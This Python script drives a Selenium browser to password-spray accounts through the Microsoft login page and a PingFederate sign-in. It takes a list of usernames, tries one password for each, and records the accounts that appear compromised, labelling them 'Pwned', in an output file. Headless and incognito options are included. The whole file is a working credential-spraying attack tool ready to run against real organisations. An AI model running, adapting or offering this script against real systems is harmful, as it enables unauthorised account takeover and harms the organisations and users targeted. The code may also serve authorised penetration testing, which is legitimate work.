from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import argparse

LOGIN_URL = "https://login.microsoftonline.com"

def spray_users(username, password, output_file, incognito, headless):
    options = Options()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    if incognito:
        options.add_argument("--incognito")
    if headless:
        options.add_argument("--headless")

    with webdriver.Chrome(options=options) as driver:
        wait = WebDriverWait(driver, 20)

        # Step 1: Navigate to Microsoft login page
        driver.get(LOGIN_URL)
        print(f'[*] Navigating to Microsoft login for: {username}')

        # Step 2: Enter username on Microsoft login page
        try:
            username_input = wait.until(
                EC.presence_of_element_located((By.NAME, "loginfmt"))
            )
            username_input.send_keys(username)
            time.sleep(1)

            # Click the "Next" button
            next_button = wait.until(
                EC.element_to_be_clickable((By.ID, "idSIButton9"))
            )
            next_button.click()
        except Exception as e:
            print(f'[-] Failed to submit username at Microsoft login: {e}')
            driver.quit()
            return

        # Step 3: Wait for redirect to PingFederate and enter credentials
        print(f'[*] Waiting for PingFederate redirect...')
        try:
            pf_username_input = wait.until(
                EC.presence_of_element_located((By.ID, "username"))
            )
            pf_username_input.clear()
            pf_username_input.send_keys(username)

            pf_password_input = driver.find_element(By.ID, "password")
            pf_password_input.send_keys(password)
            print(f'[*] Spraying The User : {username} !')
            time.sleep(1)

            # Submit the form
            pf_password_input.submit()
            time.sleep(3)

            # Check if login succeeded by seeing if we left the password page
            password_fields = driver.find_elements(By.ID, 'password')
            if password_fields:
                print(f'[-] The User: {username} With The Password: {password} did not Pwned')
            else:
                print(f'[+] Seems like The User {username} is Pwned!')
                with open(output_file, "a") as f:
                    f.write(username + "\n")

        except Exception as e:
            print(f'[-] The User: {username} did not reach PingFederate portal: {e}')

        driver.quit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", required=True, help="Path to the output file for valid sprayed users")
    parser.add_argument("--password", required=True, help="Password to use for spraying")
    parser.add_argument("--users", required=True, help="Path to the input user file")
    parser.add_argument("--incognito", action='store_true', help="Enable incognito mode for the browser")
    parser.add_argument("--headless", action='store_true', help="Enable headless mode for the browser")
    args = parser.parse_args()

    with open(args.users, 'r') as file:
        for line in file:
            spray_users(line.strip(), args.password, args.output, args.incognito, args.headless)
